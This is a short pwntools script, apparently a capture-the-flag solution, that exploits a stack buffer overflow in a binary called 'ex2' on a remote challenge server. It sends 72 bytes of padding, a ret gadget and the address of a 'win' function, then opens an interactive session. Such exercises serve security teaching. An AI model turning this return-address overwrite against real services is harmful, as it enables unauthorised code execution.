#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./ex2')

host = args.HOST or 'edc.ept.gg'
port = int(args.PORT or 8885)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *main+58
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
x = io.recvline()
print(x)
ret = b'\x11\x12\x40\x00\x00\x00\x00\x00'
win_func = b'\xfb\x11\x40\x00\x00\x00\x00\x00'
# 0x000000000040118c
io.sendline(cyclic(72, n=8) + ret  + win_func)
io.interactive()

